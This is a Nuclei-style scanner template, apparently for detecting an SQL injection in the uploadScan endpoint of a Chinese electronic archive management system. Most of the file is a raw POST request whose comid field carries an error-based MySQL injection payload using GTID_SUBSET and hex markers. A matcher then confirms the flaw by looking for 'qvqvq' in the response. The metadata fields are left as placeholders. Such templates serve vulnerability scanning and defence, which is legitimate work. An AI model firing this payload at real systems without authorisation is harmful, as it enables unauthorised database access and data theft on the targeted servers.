id: unissoft-uploadScan-sqli
info:
  name: Template Name
  author: wangzong
  severity: high
  description: 紫光电子档案管理系统 uploadscan 存在Sql注入
  reference:
    - https://
  tags: tags
http:
  - raw:
      - |-
        POST /Archive/ErecordManage/uploadScan HTTP/1.1
        Host: {{Hostname}}
        Content-Length: 122
        Pragma: no-cache
        Cache-Control: no-cache
        Content-Type: application/x-www-form-urlencoded
        Upgrade-Insecure-Requests: 1
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7)
        Accept-Encoding: gzip, deflate, br
        Accept-Language: zh-CN,zh;q=0.9
        Cookie: PHPSESSID=d975079e026f37100363a28c7f5d81b0; winWidth=1395; winHeight=897
        Connection: close

        userID=admin&fondsid=1&comid=1' AND GTID_SUBSET(CONCAT(0x7176717671,(SELECT (ELT(4599=4599,1))),0x7171627871),4599)-- bbjp
    matchers:
      - type: word
        part: body
        words:
          - 'qvqvq'
